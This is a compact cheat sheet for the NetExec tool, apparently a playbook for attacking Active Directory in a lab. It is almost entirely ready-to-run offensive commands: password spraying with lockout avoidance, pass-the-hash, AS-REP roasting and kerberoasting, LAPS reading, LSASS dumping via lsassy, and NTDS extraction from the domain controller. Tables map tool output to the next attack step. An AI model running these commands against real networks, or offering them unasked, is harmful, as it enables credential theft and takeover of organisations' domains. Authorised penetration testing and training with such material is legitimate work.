# NetExec (`nxc` / `netexec`)

Default probe. If nxc cannot see the DC, nothing else will.

## When / not

Use for: live hosts, signing, null/guest, spray, roast, shares, sessions, modules (`lsassy`, `gpp_password`, `laps`, `ntds`).
Do not use for: forging tickets, RBCD writes, ESC1 req, interactive SQL. Hand those to Impacket / Certipy / bloodyAD.

## Flags that matter

```
nxc smb {{CIDR}} --gen-relay-list /logs/enum/relay.txt
nxc smb {{DC}} --pass-pol
nxc smb {{DC}} -u '' -p '' --users --shares
nxc smb {{DC}} -u guest -p '' --shares            # null denied but guest binds? use guest
nxc ldap {{DC}} -u guest -p '' --users            # guest → LDAP → BloodHound
nxc smb {{DC}} -u users.txt -p users.txt --no-bruteforce --continue-on-success
nxc smb {{DC}} -u {{USER}} -H {{HASH}}            # PTH
nxc smb {{DC}} -u {{USER}} -H {{HASH}} --local-auth
nxc smb {{FQDN}} --use-kcache                     # after getTGT
nxc ldap {{DC}} -u {{USER}} -p '{{PASS}}' --users --groups --computers --trusts
nxc ldap {{DC}} -u {{USER}} -p '{{PASS}}' --asreproast /logs/hashes/asrep.txt
nxc ldap {{DC}} -u {{USER}} -p '{{PASS}}' --kerberoasting /logs/hashes/kerb.txt
nxc ldap {{DC}} -u {{USER}} -p '{{PASS}}' --trusted-for-delegation
nxc ldap {{DC}} -u {{USER}} -p '{{PASS}}' -M laps
nxc smb {{CIDR}} -u {{USER}} -p '{{PASS}}' --sessions --loggedon-users --shares
nxc smb HOST -u {{USER}} -p '{{PASS}}' -M lsassy
nxc smb {{DC}} -u {{USER}} -p '{{PASS}}' --ntds    # DA only
nxc mssql|winrm|rdp {{CIDR}} -u {{USER}} -p '{{PASS}}'
```

`--no-bruteforce` pairs line N of users with line N of passwords (user=pass). Without it you cartesian-product and lock the lab.
`--continue-on-success` keeps walking after the first hit.
`-k` / `--use-kcache` when NTLM is dead (Protected Users).

## Read this

| Line | Means |
| --- | --- |
| `(signing:True)` on a DC | do not SMB-relay that host |
| `(signing:False)` on a member | ntlmrelayx target |
| `[+] DOMAIN\user:pass` | valid cred — stash, BloodHound next |
| `(Pwn3d!)` | local admin on that host — dump |
| `--pass-pol` Lockout Threshold `5` | cap at 2–3 |
| `--pass-pol` `None` | spray is cheap |
| null denied, no users | try `-u guest -p ''` before RID cycle — empty pw is first-class |
| empty `--users` on null | hardened — RID cycle (`enum.md`) |

## Fail → next

| Symptom | Next |
| --- | --- |
| no hosts | wrong VLAN / VPN / macvlan parent |
| `STATUS_LOGON_FAILURE` everywhere | not a cred, or local-auth vs domain |
| `STATUS_ACCOUNT_LOCKED_OUT` | stop spray. wait. kerbrute next time |
| `KDC_ERR_PREAUTH_FAILED` | bad pass, not “Kerberos broken” |
| `KRB_AP_ERR_SKEW` | `ntpdate -u {{DC}}` |
| Kerberos/`--kerberoasting` RST on VPN, SMB fine | tun0 path-MTU black-hole — `ip link set dev tun0 mtu 1200` (`/opt/adtk/preflight.sh`) |
| `NetBIOSTimeout` on `--rid-brute` over a slow/VPN link | too chatty for ~250ms RTT — pivot to bulk anonymous LDAP (`enum.md`) |
| LDAP bind fails, SMB works | keep SMB; try `-k` or guest |
| module missing | `nxc smb --list-modules` then Impacket |

## Chain

banner → unauth → asrep/spray → BloodHound → (Pwn3d ? lsassy : ACL/ADCS).
Relay list only if any `signing:False`.
